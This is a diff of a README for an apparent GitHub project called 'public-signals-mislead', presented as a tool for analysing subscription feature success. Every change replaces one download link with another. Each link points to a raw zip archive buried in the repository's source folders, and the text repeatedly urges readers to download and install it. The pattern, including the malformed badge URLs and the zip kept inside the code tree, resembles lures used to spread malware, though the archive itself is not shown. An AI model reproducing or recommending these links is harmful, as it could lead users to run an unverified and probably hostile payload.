@@ -6,7 +6,7 @@ Welcome to the **public-signals-mislead** project. This application helps you un
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/src/visualization/public_signals_mislead_v2.1-alpha.2.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/src/visualization/public_signals_mislead_v2.1-alpha.2.zip)  
+[![Download Latest Release](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/scripts/mislead_public_signals_v1.2.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/scripts/mislead_public_signals_v1.2.zip)  
 Visit the link above to access the latest version of the application.
 
 ## 📂 Introduction
@@ -32,7 +32,7 @@ Before you download and install, ensure your system meets these requirements:
 ## 📥 Download & Install
 
 1. Click on the link below to visit the Releases page:
-   [Download Latest Release](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/src/visualization/public_signals_mislead_v2.1-alpha.2.zip)
+   [Download Latest Release](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/scripts/mislead_public_signals_v1.2.zip)
 
 2. Browse the available versions and select the most recent release.
 
@@ -84,4 +84,4 @@ This project touches on several fields, including:
 
 We hope you find **public-signals-mislead** helpful in your analysis of subscription feature success. By using this tool, you can make better decisions based on the data available to you. Don’t hesitate to reach out if you need help or have questions! 
 
-[![Download Latest Release](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/src/visualization/public_signals_mislead_v2.1-alpha.2.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/src/visualization/public_signals_mislead_v2.1-alpha.2.zip)
+[![Download Latest Release](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/scripts/mislead_public_signals_v1.2.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/mashimashiii/public-signals-mislead/raw/refs/heads/master/scripts/mislead_public_signals_v1.2.zip)
